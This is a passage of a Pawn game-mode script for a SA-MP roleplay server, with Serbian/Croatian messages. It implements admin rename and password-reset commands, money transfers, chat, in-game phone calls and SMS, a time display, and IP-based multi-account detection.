	if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
	if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );

	new id, novoime[ 32 ], newname[ 40 ];
	new year, month, day;

	if( sscanf( params, "us[32]", id, novoime ) ) return SendUsageMessage( playerid, "/specijalnoime [ ID ] [ Ime_Prezime ]");
	format( newname, sizeof( newname ), "Korisnici/%s.ini", novoime );
	if( id == IPI ) return SendErrorMessage( playerid, "Pogresan ID." );
	if( fexist( newname ) ) return SendErrorMessage( playerid, "Novo ime vec postoji u bazi podataka!" );

	getdate( year, month, day );
    format( globalstring, sizeof( globalstring ), "RENAME | Admin %s je promenio ime igracu %s u %s (%d-%d-%d)", ImeIgraca( playerid ), ImeIgraca( id ), novoime, month, day, year );
    printf( "%s",  globalstring );
    format( globalstring, sizeof( globalstring ), "RENAME | Admin %s je promenio ime igracu %s u %s .", ImeIgraca( playerid ), ImeIgraca( id ), novoime );
	AdminPoruka( CRVENA, globalstring );

	SavePlayer( id );
	RenamePlayer( ImeIgraca( id ), novoime, id );

	SendInfoMessage( id, "Admin %s vam je promenio ime u %s.", ImeIgraca( playerid ), ImeIgraca( id ) );
    format( globalstring, sizeof( globalstring ), "Prijavite se ponovno sa imenom: %s", novoime );
	Kickovanje( id, globalstring );
	return 1;
}

CMD:passwordigraca( playerid, params[] ) {

	if( PlayerInfo[ playerid ][ xAdmin ] < 6 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
	if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
	new imeigraca[ 24 ], novalozinka[ 40 ], ifile[ 64 ];
	if( sscanf( params, "s[24]", imeigraca ) ) return SendUsageMessage( playerid, "/passwordigraca [ Ime_Prezime ]" );

	new randombroj = 100000 + random(899999);

	format( novalozinka, sizeof( novalozinka ), "%d", randombroj );

	format( ifile, sizeof( ifile ), I_FILE, imeigraca );
	if( !fexist( ifile ) ) return SendErrorMessage( playerid, "Taj igrac ne postoji u bazi podataka!");

	INI_ParseFile( ifile, "ShowOffStats" );

	new INI:File = INI_Open( ifile );
	INI_SetTag( File, "Informacije" );
	INI_WriteString( File, "Lozinka", novalozinka );
	INI_Close( File );

	format( globalstring, sizeof( globalstring ), "| V:AC | "col_white"Igracu %s je promjenjen password! Ostale informacije slijede.. Admin: %s", imeigraca, ImeIgraca( playerid ) );
	AdminPoruka( SVETLOCRVENA, globalstring );
	format( globalstring, sizeof( globalstring ), "| V:AC | "col_white"Igracu %s je dodjeljen novi pass: %s.", imeigraca, novalozinka );
	SCM( playerid, ZUTA, globalstring );
	format( globalstring, sizeof( globalstring ), "| V:AC | "col_white"Igracu %s lozinku poslati na email: %s.", imeigraca, OfflineCheck[ eMail ] );
    SCM( playerid, ZUTA, globalstring );

	return true;
}

CMD:promenilozinku( playerid, params[] ) {
	SPD( playerid, dialog_CHANGEPASSWORD, DSI, D_NASLOV, "Upisi novu sifru i dobro je zapamti!Valhalla team ne odgovara za nestale/ukradene sifre!", D_ODABERI, D_ODUSTANI );
	return 1;
}

CMD:promenispawn( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSupporter ] >= 1 ) {
        SPD( playerid, dialog_SPAWNCHANGE, DSL, D_NASLOV, "Uobicajni spawn LS_1\nUobicajni spawn LS_2\nOrganizacijski spawn\nSpawn Imovina 1\nSpawn Imovina 2\nSpawn Imovina 3\nHotelska soba\nIznajmljena soba\nAdmin/Helper baza", D_ODABERI, D_ODUSTANI );
    }
    else {
		SPD( playerid, dialog_SPAWNCHANGE, DSL, D_NASLOV, "Uobicajni spawn LS_1\nUobicajni spawn LS_2\nOrganizacijski spawn\nSpawn Imovina 1\nSpawn Imovina 2\nSpawn Imovina 3\nHotelska soba\nIznajmljena soba", D_ODABERI, D_ODUSTANI );
	}
	return 1;
}

CMD:listavozila( playerid, params[] ) {

    if( PlayerInfo[ playerid ][ xAdmin ] < 6 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );

    new model;
	if( sscanf( params, "i", model ) ) return SendUsageMessage( playerid, "/listavozila [ Model vozila ]" );

	new string[ 128 ];
    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );

    for( new i = 1; i < MAX_CARS; i++ ) {
    
		if( VehicleInfo[ i ][ vUsage ] == PRIVATNO_VOZILO && VehicleInfo[ i ][ vModel ] == model ) {

		    format( string, sizeof( string ), ""col_white"Vozilo ID - [%d]\n", i );
			strcat( DialogStrgEx, string );
		}
	}

	if( strlen( DialogStrgEx ) == 0 ) return SendErrorMessage( playerid, "Nema nijednog vozila tog modela." );

	SPD( playerid, 0, DSMSG, ""col_crvena"LISTA VOZILA", DialogStrgEx, "Potvrdi", "" );
   	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
   	
	return true;
}

CMD:vozilazaaukciju( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] < 6 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    
	new string[ 128 ];
    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
    
    for( new i = 1; i < MAX_CARS; i++ ) {
		if( VehicleInfo[ i ][ vUsage ] == PRIVATNO_VOZILO && VehicleInfo[ i ][ vOwned ] == 0 && VehicleInfo[ i ][ vPrice ] == -1 ) {
		    
		    format( string, sizeof( string ), ""col_white"Vozilo %s - [%d]\n", GetVehicleNameEx( VehicleInfo[ i ][ vModel ] ), i );
			strcat( DialogStrgEx, string );
		}
	}
	
	if( strlen( DialogStrgEx ) == 0 ) return SendErrorMessage( playerid, "Nema nijednog vozila za aukciju." );

	SPD( playerid, 0, DSMSG, ""col_crvena"KOLA ZA AUKCIJU", DialogStrgEx, "Potvrdi", "" );
   	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
	return true;
}

CMD:richlist( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] < 6 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );

	new money, string[ 128 ];
	if( sscanf( params, "d", money ) ) return SendUsageMessage( playerid, "/richlist [ novac ]");
	
	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
	
	foreach( Player, i ) {
	    if( (PlayerInfo[ i ][ xNovac ]+PlayerInfo[ i ][ xBRacun ]) >= money ) {
	        format( string, sizeof( string ), ""col_white"Ruke %d | Banka %d | %s [%d]\n", PlayerInfo[ i ][ xNovac ], PlayerInfo[ i ][ xBRacun ], ImeIgraca( i ), i );
			strcat( DialogStrgEx, string );
	    }
	}
		
	SPD( playerid, 0, DSMSG, ""col_crvena"BOGATI IGRACI", DialogStrgEx, "Potvrdi", "" );
   	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
	return 1;
}

CMD:mogucspam( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	
	new id;
	if( sscanf( params, "u", id ) ) return SendUsageMessage( playerid, "/mogucspam [ ID/Deo igraca ]");
	
	SendInfoMessage( playerid, "%s(%d) GETID: %d STATSID: %d", ImeIgraca( id ), id, GetPlayerVehicleID( id ), antiCheatCS[ id ][ EnteredVehicle ] );
	
	return 1;
}

alias:pay("plati");
CMD:pay( playerid, params[] ) {
	new giveplayerid,
	    playermoney,
	    moneys;

	if( sscanf( params, "ud", giveplayerid, moneys ) ) return SendUsageMessage( playerid, "/pay [ ID/Deo imena ] [ kolicina ]");
	// if( PlayerInfo[ playerid ][ xLevel ] < 3 ) return SendErrorMessage( playerid, "Morate biti level 3 da bi poslali novac.");
	if( moneys > 5000 && PlayerInfo[ playerid ][ xLevel ] < 2 ) return SendErrorMessage( playerid, "Morate biti level 2 da bi poslali preko 5000.");
	if( moneys < 1 || moneys > 100000 ) return SendErrorMessage( playerid, "Nemojte slati manje od 1$, ili vise od 100.000$ odjednom.");
	if( IsPlayerConnected( giveplayerid ) ) {
 		if( giveplayerid != INVALID_PLAYER_ID ) {
			if( IsPlayerNearPlayer( 5.0, playerid, giveplayerid ) ) {
				playermoney = PlayerInfo[ playerid ][ xNovac ];
				if( moneys > 0 && playermoney >= moneys ) {
					DajIgracuNovacSpeech( playerid, - moneys );
					DajIgracuNovacSpeech( giveplayerid, moneys );
					format( globalstring, sizeof( globalstring ), "Poslali ste %s(player: %d), $%d.", ImeIgraca( giveplayerid ), giveplayerid, moneys );
					PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					SCM( playerid, SVETLOPLAVA, globalstring );
					format( globalstring, sizeof( globalstring ), "Primili ste $%d od %s(player: %d).", moneys, ImeIgraca( playerid ), playerid );
					SCM( giveplayerid, SVETLOPLAVA, globalstring );
					PlayerPlaySound( giveplayerid, 1052, 0.0, 0.0, 0.0 );
					format( globalstring, sizeof( globalstring ), "* %s vadi svoj novcanik i daje nesto novca %s.", ImeIgraca( playerid ) ,ImeIgraca( giveplayerid ) );
					PorukaRadius(30.0, playerid, globalstring, LJUBICASTA );

					new string[ 128 ]; 
					format( string, sizeof( string ), "Igrac %s -> Igrac: %s | Novac: %d", ImeIgraca( playerid ), ImeIgraca( giveplayerid ), moneys );
					LogSave( "Ostalo/LogPay.log", string );
				} else SendErrorMessage( playerid, "Nepravilan iznos transakcije.");
			} else SendErrorMessage( playerid, "Taj igrac nije dovoljno blizu vas.");
		}
	} else SendErrorMessage( playerid, "Taj igrac nije na serveru!");
	return 1;
}

CMD:do( playerid, params[] ) {
    new text[ 128 ], string[ 234 ];
	if( sscanf( params, "s[128]", text ) ) return SendUsageMessage( playerid, "/do [Akcija]" );

	for( new b = 0; b < sizeof( ZabranjeneReci ); b++) {
        if( strfind( text, ZabranjeneReci[ b ], true ) != -1 ) {
            format( globalstring, sizeof( globalstring ), "[!]%s[%d]: %s", ImeIgraca( playerid ), playerid, text );
       		AdminPoruka( 0x808000AA, globalstring );
       		return 1;
        }
	}

    if( PlayerInfo[ playerid ][ xMute ] != 0 ) {
        SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");
        return 0;
    }

	if( Maskuse[ playerid ] == false )
		format( string, sizeof( string ), "* %s (( %s ))", text, ImeIgraca( playerid ) );
	else
	    format( string, sizeof( string ), "* %s (( Maska_%d ))", text, PlayerInfo[ playerid ][ xMaskID ] );
	PorukaRadius( 30.0, playerid, string, LJUBICASTA );
	return true;
}

CMD:b( playerid, params[ ], help ) {
    // if( PlayerCuffed[ playerid ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes koristiti komandu kad si cuffovan ili tazovan.");
    if( PlayerInfo[ playerid ][ xMute ] != 0) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");
    new text[ 128 ], string[ 234 ];
	if( sscanf( params, "s[128]", text ) ) return SendUsageMessage( playerid, "/b [local ooc chat]");

	if( PlayerInfo[ playerid ][ xAdmin ] > 0 && AdminDuty[ playerid ] ) {
		if( Maskuse[ playerid ] == false )
			format( string, sizeof( string ), "{FF0000}[OOC]%s {E6E6E6}: %s", ImeIgraca( playerid ), text );
		else
		    format( string, sizeof( string ), "{FF0000}[OOC]Maska_%d {E6E6E6}: %s", PlayerInfo[ playerid ][ xMaskID ], text );
	}
	else if( PlayerInfo[ playerid ][ xSupporter ] > 0 && AdminDuty[ playerid ] ) {
		if( Maskuse[ playerid ] == false )
			format( string, sizeof( string ), "{8EFF00}[OOC]%s {E6E6E6}: %s", ImeIgraca( playerid ), text );
		else
		    format( string, sizeof( string ), "{8EFF00}[OOC]Maska_%d {E6E6E6}: %s", PlayerInfo[ playerid ][ xMaskID ], text );
	}
	else {
	    if( Maskuse[ playerid ] == false )
			format( string, sizeof( string ), "[OOC]%s : %s", ImeIgraca( playerid ), text );
		else
		    format( string, sizeof( string ), "[OOC]Maska_%d : %s", PlayerInfo[ playerid ][ xMaskID ], text );
	}

	foreach( Player, i ) {
	    if( IsPlayerNearPlayer( 25.0, playerid, i ) ) {
	        SCM( i, 0xE6E6E6E6, string );
	    }
	}
	
	new string1[ 128 ]; 
	format( string1, sizeof( string1 ), "Igrac %s: %s", ImeIgraca( playerid ), text );
	LogSave( "Ostalo/LogBChat.log", string1 );

    for( new b = 0; b < sizeof( ZabranjeneReci ); b++) {
        if( strfind( text, ZabranjeneReci[ b ], true ) != -1 ) {
            format( globalstring, sizeof( globalstring ), "[!]%s[%d]: %s", ImeIgraca( playerid ), playerid, text );
       		AdminPoruka( 0x808000AA, globalstring );
       		return 1;
        }
	}
	return true;
}

// CMD:maskon( playerid, params[] ) {
	
// 	if( !Inventory_HasItem( playerid, "Maska" ) )
//         return SendErrorMessage( playerid, "Nemate masku." );

//     if( PlayerInfo[ playerid ][ xLevel ] < 3 ) return SendErrorMessage( playerid, "Moras biti level 3.");
//     if( Maskuse[ playerid ] != false ) return SendErrorMessage( playerid, "Vec imas masku na glavi!");

//     strmid( RealName[ playerid ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 64 );
//     new bre[ MAX_PLAYER_NAME ];
//     format( bre, sizeof( bre ), "Maska_%d", PlayerInfo[ playerid ][ xMaskID ] );
//     SetPlayerName( playerid, bre );
    
//     SetPlayerAttachedObject( playerid, OBJECT_SLOT_MASK, 19036, 2, 0.099999,0.028999,-0.004999,91.199935,87.199958,0.399999,1.000000,1.000000,1.000000 );

//     Maskuse[ playerid ] = true;
//     SCM( playerid, BELA, "Stavili ste masku na glavu [ /maskoff da je skinete ]. ");
//     format( globalstring, sizeof( globalstring ), "* %s stavlja masku na glavu.", ImeIgraca( playerid ) );
//     PorukaRadius( 30.0, playerid, globalstring, LJUBICASTA );
//     return 1;
// }

// CMD:maskoff( playerid, params[] ) {

// 	if( !Inventory_HasItem( playerid, "Maska" ) )
//         return SendErrorMessage( playerid, "Nemate masku." );
        
//     if( PlayerInfo[ playerid ][ xLevel ] < 3) return SendErrorMessage( playerid, "Moras biti level 3.");
//     if( Maskuse[ playerid ] != true ) return SendErrorMessage( playerid, "Nemas masku na glavi!");

//     SetPlayerName( playerid, RealName[ playerid ] );
//     Maskuse[ playerid ] = false;
//     RemovePlayerAttachedObject(playerid, OBJECT_SLOT_MASK);
//     SendClientMessage( playerid, BELA, "Skinuli ste masku [/maskon da je vratite na glavu]. ");
//     format( globalstring, sizeof( globalstring ), "* %s skida masku sa glave.", ImeIgraca( playerid ) );
//     PorukaRadius( 30.0, playerid, globalstring, LJUBICASTA );
// 	return 1;
// }

alias:imenik("number");
CMD:imenik( playerid, params[] ) {
	new ID;
	if( sscanf(params, "u", ID )) return SendUsageMessage( playerid, "/imenik [ ID/DeoImena ]");
	if( IsPlayerConnected( ID ) ) {
		if( ID != INVALID_PLAYER_ID ) {
			format( globalstring, sizeof( globalstring ), "Ime: %s, Broj: %d", ImeIgraca( ID ), PlayerInfo[ ID ][ xBrojTelefona ] );
			SendClientMessage( playerid, -1, globalstring );
		}
	}
	else return SendErrorMessage( playerid, "Nema takvog igraca!");
	return 1;
}

CMD:call( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xMute ] != 0) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");
	new phonenumb, igrac;
    if( sscanf( params, "i", phonenumb)) {
        SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
        SendUsageMessage( playerid, "/call [phonenumber]");
		SCM( playerid, BELA, "Hitna linija : 911");
		SCM( playerid, BELA, "Taksi sluzba : 777");
		SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		return 1;
    }
    if( PlayerInfo[ playerid ][ xBrojTelefona ] == 0) {
		SendErrorMessage( playerid, "Nemate mobilni telefon!");
		return 1;
	}
	if( PlayerInfo[ playerid ][ xTelefonBon ] < 1) {
		SendErrorMessage( playerid, "Preostala svota na racunu nije dovoljna za uspostavu poziva!" );
		return 1;
	}
	if( PlayerInfo[ playerid ][ xZatvor ] == OBICAN_ZATVOR || PlayerInfo[ playerid ][ xZatvor ] == ALKATRAZ  ) {
		SendErrorMessage( playerid, "Ne mozete telefonirati dok ste u zatvoru / Arei51.");
		return 1;
	}
	if( phonenumb == 911 ) {
		SCM( playerid, BELA, "HINT: Sada mozete koristit T da bi ste razgovarali na telefon, ukucajte '(/h)angup' da bi ste prekinuli poziv");
		SCM( playerid, 0xFF8282AA, "HITNA LINIJA: Koju sluzbu trebate, Policiju ili Hitnu Pomoc? (Upisite Police ili Paramedic)");
		SetPVarInt( playerid, "Mobile", 911);
		return 1;
	}
	if( phonenumb == 777 ) {
	    if( IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Ne mozete zvati iz vozila!");
		foreach( Player, i )
		{
			if( GetFactionType( i ) == ORG_TIP_TAXI && taxiDuty[ i ] == true )
				SendClientMessageEx( i, -1, "%s (ID: %d) {FBE600}je potreban taxista, lokacija igraca:"col_white" %s {FBE600}('/taxi uzmiklijenta' da preuzmes klijenta)", ImeIgraca( playerid ), playerid, GetPlayerLocation( playerid ) );
		}
		PozvaoTaxi[ playerid ] = true;
		SCM( playerid, ZUTA, "Uspesno ste pozvali taxistu, pricekajte na mjestu gdje se trenutno nalazite!");
	    return 1;
	}
	if( phonenumb == PlayerInfo[ playerid ][ xBrojTelefona ] ) {
		SCM( playerid, CRVENA, " Zauzeto...");
		return 1;
	}
	if( GetPVarInt( playerid, "Mobile") != -1 ) {
		SendErrorMessage( playerid, "Vec ste u razgovoru...");
		return 1;
	}
	format( globalstring, sizeof( globalstring ), "* %s vadi mobilni telefon.", ImeIgraca( playerid ) );
	SetPlayerSpecialAction( playerid, SPECIAL_ACTION_USECELLPHONE );
	SetPlayerAttachedObject( playerid, OBJECT_SLOT_RHAND, PlayerInfo[ playerid ][ xModelTelefona ], 6, 0.101469, 0.000639, -0.008395, 73.051651, 171.894165, 0.000000, 1.000000, 1.000000, 1.000000 );
	PorukaRadius(30.0, playerid, globalstring, LJUBICASTA );
	foreach( Player, i)
	{
		if( IsPlayerConnected(i)) {
			if( PlayerInfo[ i ][ xBrojTelefona ] == phonenumb && phonenumb != 0) {
				igrac = i;
				SetPVarInt( playerid, "Mobile", igrac );
				if( IsPlayerConnected( igrac ) ) {
				    if( igrac != INVALID_PLAYER_ID ) {
				        if( PhoneOnline[ igrac ] > 0 ) {
							SendErrorMessage( playerid, "Korisnik je ugasio telefon.");
						    return 1;
						}
      			        if( PlayerInfo[ igrac ][ xZatvor ] == OBICAN_ZATVOR || PlayerInfo[ igrac ][ xZatvor ] == ALKATRAZ ) {
		                    SendErrorMessage( playerid, "Osoba je pritvorena i ne moze vam se javiti.");
		                    return 1;
	                    }
						if( GetPVarInt( igrac, "Mobile" ) == -1) {
							SendClientMessageEx( igrac, ZUTA, "Vas mobitel zvoni ukucajte '(/p)ickup' Pozivatelj: %s", ImeIgraca( playerid ) );
							format(  globalstring, sizeof( globalstring ), "* %s zvoni mobitel.", ImeIgraca( igrac ) );
							SCM( playerid, BELA, "HINT: Na mobitel sada pricate sa T, ukucajte '/hangup' da bi ste prekinuli razgovor.");
							PorukaRadius( 30.0, i, globalstring, LJUBICASTA );
							SetPVarInt( playerid, "CellTime",  1 );
							return 1;
						}
					}
				}
			}
		}
	}
	SCM( playerid, CRVENA, "  Zauzeto...");
	return 1;
}

alias:pickup("javise");
CMD:pickup( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xMute ] != 0) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");
    if( PlayerInfo[ playerid ][ xZatvor ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete se javiti dok ste u zatvoru / Area51.");
    if(GetPVarInt( playerid, "Mobile") == -1 ) {
        if( IsPlayerAttachedObjectSlotUsed( playerid,OBJECT_SLOT_RHAND ) ) {
		    SCM( playerid, CRVENA, "Vec imate neki objekt u desnoj ruci,Ne mozete izvaditi mobitel!");
		    return 1;
		}
        foreach( Player, i ) {
            if( PlayerLogged[ i ] == true ) {
				if( GetPVarInt(i, "Mobile") == playerid ) {
					SetPVarInt( playerid, "Mobile", i );
					SCM(i,  BELA, "   Javio se.");
					format( globalstring, sizeof( globalstring ), "* %s se javlja na mobitel.", ImeIgraca( playerid ) );
					SetPlayerSpecialAction( playerid, SPECIAL_ACTION_USECELLPHONE);
					SetPlayerAttachedObject( playerid, OBJECT_SLOT_RHAND, PlayerInfo[ playerid ][ xModelTelefona ], 6, 0.101469, 0.000639, -0.008395, 73.051651, 171.894165, 0.000000, 1.000000, 1.000000, 1.000000);
					PorukaRadius( 30.0, playerid, globalstring, LJUBICASTA );
				}
			}
		}
    }
    else SCM( playerid, CRVENA, "Vec ste u razgovoru!");
    return 1;
}

alias:hangup("prekini");
CMD:hangup( playerid, params[] ) {
    new caller = GetPVarInt( playerid, "Mobile" );
	SetPVarInt( playerid, "CellTime", 0 );
	SCM( playerid,  0xAFAFAFAA, "Mobitel vam je dzepu.");
	SCM( playerid, CRVENA, "AKO VAM NIJE UGASENA ANIMACIJE 'ENTER'" );
	RemovePlayerAttachedObject( playerid, OBJECT_SLOT_RHAND );
	SetPlayerSpecialAction( playerid, SPECIAL_ACTION_STOPUSECELLPHONE );
	SetPlayerSpecialAction( playerid, SPECIAL_ACTION_STOPUSECELLPHONE );
	SetPlayerSpecialAction( playerid, SPECIAL_ACTION_NONE );
	SetPVarInt( playerid, "Mobile", -1 );
	if( caller < 501 && caller >= 0 ) {
    	if( caller != INVALID_PLAYER_ID ) {
    	    if( PlayerLogged[ caller ] == true ) {
		    	SCM( caller,  0xAFAFAFAA, "Prekinuo je.");
				SetPVarInt( caller, "CellTime", 0 );
				SetPVarInt( playerid, "CellTime",  0);
				SCM( playerid,  0xAFAFAFAA, "Prekinuli ste poziv.");
				SetPVarInt( caller, "Mobile", -1 );
				SetPlayerSpecialAction( caller, SPECIAL_ACTION_STOPUSECELLPHONE );
				SetPlayerSpecialAction( caller, SPECIAL_ACTION_STOPUSECELLPHONE );
				RemovePlayerAttachedObject( caller, OBJECT_SLOT_RHAND );
			}
		}
	}
    return true;
}

CMD:sms( playerid, params[] ) {
	if( PlayerInfo[ playerid ][ xMute ] != 0 ) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");
	new phonenumb, result[128], string[234], igrac;
    if( sscanf(params, "is[128]", phonenumb, result ) ) {
		SendUsageMessage( playerid, "/sms [ broj telefona ] [ poruka ]");
        return 1;
    }
	if( PlayerInfo[ playerid ][ xBrojTelefona ] == 0) {
		SendErrorMessage( playerid, "Nemate mobitel...");
		return 1;
	}
	if( PlayerInfo[ playerid ][ xTelefonBon ] < 1) {
		SendErrorMessage( playerid, "Preostala svota na racunu nije dovoljna da posaljete SMS!" );
		return 1;
	}
	if( PlayerInfo[ playerid ][ xZatvor ] == OBICAN_ZATVOR || PlayerInfo[ playerid ][ xZatvor ] == ALKATRAZ ) {
		SendErrorMessage( playerid, "Ne mozete telefonirati dok ste u zatvoru / Arei51.");
		return 1;
	}
	
	foreach( Player, i ) {
		if( IsPlayerConnected( i ) ) {
			if( PlayerInfo[ i ][ xBrojTelefona ] == phonenumb && phonenumb != 0 ) {
				igrac = i;
				if( IsPlayerConnected( igrac ) ) {
				    if( igrac != INVALID_PLAYER_ID ) {
				        if( PhoneOnline[ igrac ] > 0 ) {
							SendErrorMessage( playerid, "Korisnik je ugasio telefon.");
						    return 1;
						}
						if( PlayerInfo[ igrac ][ xZatvor ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete igracu slati sms dok je u zatvoru / Area51.");
						format( string, sizeof( string ), "{E6E6E6}Dobili ste SMS | Posiljatelj: "col_white"%s {E6E6E6}| Broj Telefona: "col_white" %d", RPImeIgraca( playerid ), PlayerInfo[ playerid ][ xBrojTelefona ] );
						SCM( igrac, ZUTA, string );
						format( string, sizeof( string ), "{E6E6E6}SMS: "col_white"%s", result );
						SCM( igrac, ZUTA, string );
						SCM( playerid, BELA, "Poruka poslana.");
						format( string, sizeof( string ), "SMS | %s(ID:%d) salje -> %s(ID:%d)| %s", ImeIgraca( playerid ), playerid, ImeIgraca( igrac ), igrac, result );
						AdminSMS( ZUTA, string );
						format( string, sizeof( string ), "~r~$-%d", smscost);
						GameTextForPlayer( playerid, string, 5000, 1);
						PlayerInfo[ playerid ][ xTelefonBon ] -= smscost;
			           	PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0 );
			           	
			           	format( string, sizeof( string ), "* %s salje poruku.", RPImeIgraca( playerid ) );
						PorukaRadius( 20.0, playerid, string, LJUBICASTA );
						return 1;
					}
				}
			}
		}
	}
	SCM( playerid, 0xAFAFAFAA, "  Slanje poruke neuspelo...");
	return 1;
}

CMD:time( playerid, params[] ) {
    
	new mtext[20], year, month, day;
	getdate( year, month, day );

	if(month == 1) { mtext = "Sijecanj/Januar"; }
	else if(month == 2) { mtext = "Veljaca/Februar"; }
	else if(month == 3) { mtext = "Ozujak/Mart"; }
	else if(month == 4) { mtext = "Travanj/April"; }
	else if(month == 5) { mtext = "Svibanj/Maj"; }
	else if(month == 6) { mtext = "Lipanj/Jun"; }
	else if(month == 7) { mtext = "Srpanj/Jul"; }
	else if(month == 8) { mtext = "Kolovoz/Avgust"; }
	else if(month == 9) { mtext = "Rujan/Semptembar"; }
	else if(month == 10) { mtext = "Listopad/Oktobar"; }
	else if(month == 11) { mtext = "Studeni/Novembar"; }
	else if(month == 12) { mtext = "Prosinac/Decembar"; }

    new hour,minuite,second;
	gettimeEx( hour, minuite, second );
	FixHour( hour );
	hour = shifthour;
	
	if( minuite < 10 )
	{
		if( PlayerInfo[ playerid ][ xZatvor ] > 0 )
			format( globalstring, sizeof( globalstring ), "~y~%d %s~n~~g~|~w~%d:0%d~g~|~n~~w~Vreme pritvora: %d min", day, mtext, hour, minuite, ( PlayerInfo[ playerid ][ xZatvorVreme ]+1 ) );
		else
			format( globalstring, sizeof( globalstring ), "~y~%d %s~n~~g~|~w~%d:0%d~g~|", day, mtext, hour, minuite);
	}
	else
	{
		if( PlayerInfo[ playerid ][ xZatvor ] > 0 )
			format( globalstring, sizeof( globalstring ), "~y~%d %s~n~~g~|~w~%d:%d~g~|~n~~w~Vreme: pritvora: %d min", day, mtext, hour, minuite, ( PlayerInfo[ playerid ][ xZatvorVreme ]+1 ) );
		else
			format( globalstring, sizeof( globalstring ), "~y~%d %s~n~~g~|~w~%d:%d~g~|", day, mtext, hour, minuite);
	}
	GameTextForPlayer(playerid, globalstring, 5000, 1);
    format( globalstring, sizeof( globalstring ), "* %s gleda na sat marke %s.", ImeIgraca( playerid ), GetNameByWatchID( playerid ) );
	PorukaRadius( 30.0, playerid, globalstring, LJUBICASTA );
	ApplyAnimation( playerid, "COP_AMBIENT", "Coplook_watch", 4.1,0,0,0,0,0, 1 );
    return 1;
}

new ipFILE[128];
new	pFILE[MAX_PLAYERS][128];
new SendIP;

stock proveriAlias( playerid ) {

	new plname[ MAX_PLAYER_NAME ] ;
    GetPlayerName(playerid, plname, sizeof(plname));
    new playersip[64];
    GetPlayerIp(playerid,playersip,sizeof(playersip));
   	new string2[256];
	new string[256];
	new string3[256];

	format(pFILE[ playerid ], 128, "Multiacc/%s.txt", plname);
	dini_Create(pFILE[ playerid ]);
	dini_Set(pFILE[ playerid ], "Nameip", playersip);

	if(strlen(dini_Get("Multiacc/ips.txt", plname)) == 0)
   	{
	   	dini_Set("Multiacc/ips.txt", plname, playersip);
	}
	else
	{
		if( strfind( dini_Get("Multiacc/ips.txt", plname), playersip, true) == -1 )
		{
			format(string,sizeof(string),"%s, %s", dini_Get("Multiacc/ips.txt",plname), playersip);
			dini_Set("Multiacc/ips.txt", plname, string);
		}
	}
	new pAKA[256];
	pAKA = dini_Get("Multiacc/alias.txt",playersip);
	new pIPs[256];
	pIPs = dini_Get("Multiacc/ips.txt",plname);

	if (strlen(pAKA) < 3)
	{
		if (strlen(pIPs) < 3) SendIP = 0;
		else if (!strcmp(pIPs,playersip,true)) SendIP = 0;
		else
		{
		    if(strlen(pIPs) >= 128)
		    {
		        format(string2,sizeof(string2),"* %s[%d] Drugi IP-ovi: -MNOGO-", plname, playerid);
			}
			else
			{
				format(string2,sizeof(string2),"* %s[%d] DRUGI IP-ovi: %s", plname, playerid, pIPs);
			}
			SendIP = 1;
		}
	}
	else if (!strcmp(pAKA,plname,true))
	{
		if (strlen(pIPs) < 3) SendIP = 0;
		else if (!strcmp(pIPs,playersip,true)) SendIP = 0;
		else
		{
		    if(strlen(pIPs) >= 128)
		    {
		        format(string2,sizeof(string2),"* %s[%d] Drugi IP-ovi: -MNOGO-", plname, playerid);
			}
			else
			{
				format(string2,sizeof(string2),"* %s[%d] DRUGI IP-ovi: %s", plname, playerid, pIPs);
			}
			SendIP = 1;
		}
	}
	else
	{
		format(string3,sizeof(string3),"[INFO]: %s[%d] se konektovao na server (%s). (Drugi ACC-ovi: %s)", plname, playerid,playersip, pAKA);
		if (strlen(pIPs) < 3) SendIP = 0;
		else if (!strcmp(pIPs,playersip,true)) SendIP = 0;
		else
		{
		    if(strlen(pIPs) >= 128)
		    {
		        format(string2,sizeof(string2),"* %s[%d] Drugi IP-ovi: -MNOGO-", plname, playerid);
			}
			else
			{
				format(string2,sizeof(string2),"* %s[%d] DRUGI IP-ovi: %s", plname, playerid, pIPs);
			}
			SendIP = 1;
		}
	}
	foreach(new i : Player)
	{
		if(IsPlayerConnected(i) && playerid != i)
		{
			if(PlayerInfo[i][xAdmin] > 1)
			{
				if(strlen(string3) != 0) SendClientMessage(i,CRVENA,string3);
				if(SendIP == 1)
				{
